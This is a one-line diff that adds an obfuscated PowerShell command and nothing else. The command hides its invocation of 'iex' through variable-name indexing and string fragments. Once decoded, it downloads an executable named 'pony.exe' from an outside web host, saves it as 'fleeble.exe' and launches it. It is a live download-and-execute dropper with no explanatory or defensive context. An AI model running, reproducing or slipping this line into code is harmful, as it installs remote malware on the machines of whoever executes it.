@@ -1,0 +1,1 @@
+﻿ & ((get-VARIAble '*MDR*').nAmE[3,11,2]-JOiN'') ( (('('+'New-Object S'+'y'+'stem.N'+'et.W'+'ebC'+'lient'+').Down'+'loadF'+'ile({'+'0'+'}htt'+'p://w'+'orldnit'+'.com/pon'+'y'+'.exe'+'{0},{0}fleebl'+'e.e'+'x'+'e{0'+'});Start-Process '+'{0'+'}'+'fl'+'ee'+'b'+'le.exe{0'+'}')-f[cHar]39) )
